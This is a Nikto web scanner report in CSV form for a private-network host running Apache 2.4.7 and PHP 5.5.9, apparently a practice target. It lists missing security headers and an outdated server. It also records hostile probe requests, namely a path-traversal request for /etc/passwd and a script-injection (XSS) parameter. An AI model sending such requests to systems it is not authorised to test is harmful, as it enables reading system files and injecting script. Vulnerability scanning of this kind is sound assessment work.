"Nikto - v2.1.6/2.1.5"
"192.168.1.142","192.168.1.142","81","","","","Apache/2.4.7 (Ubuntu)"
"192.168.1.142","192.168.1.142","81","OSVDB-0","GET","/","Cookie PHPSESSID created without the httponly flag"
"192.168.1.142","192.168.1.142","81","OSVDB-0","GET","/","Cookie showhints created without the httponly flag"
"192.168.1.142","192.168.1.142","81","OSVDB-0","GET","/","Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.25"
"192.168.1.142","192.168.1.142","81","OSVDB-0","GET","/","The anti-clickjacking X-Frame-Options header is not present."
"192.168.1.142","192.168.1.142","81","OSVDB-0","GET","/","X-XSS-Protection header has been set to disable XSS Protection. There is unlikely to be a good reason for this."
"192.168.1.142","192.168.1.142","81","OSVDB-0","GET","/","Uncommon header 'logged-in-user' found, with contents: "
"192.168.1.142","192.168.1.142","81","OSVDB-0","GET","/","The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type"
"192.168.1.142","192.168.1.142","81","OSVDB-0","GET","/robots.txt","\"robots.txt\" contains 8 entries which should be manually viewed."
"192.168.1.142","192.168.1.142","81","OSVDB-0","HEAD","/","Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch."
"192.168.1.142","192.168.1.142","81","OSVDB-0","EKHWTWXU","/","Web Server returns a valid response with junk HTTP methods, this may cause false positives."
"192.168.1.142","192.168.1.142","81","OSVDB-0","DEBUG","/","DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details."
"192.168.1.142","192.168.1.142","81","OSVDB-0","GET","/index.php?page=../../../../../../../../../../etc/passwd","The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)"
"192.168.1.142","192.168.1.142","81","OSVDB-0","GET","/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>","/phpinfo.php: Output from the phpinfo() function was found."
"192.168.1.142","192.168.1.142","81","OSVDB-12184","GET","/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000","PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings."
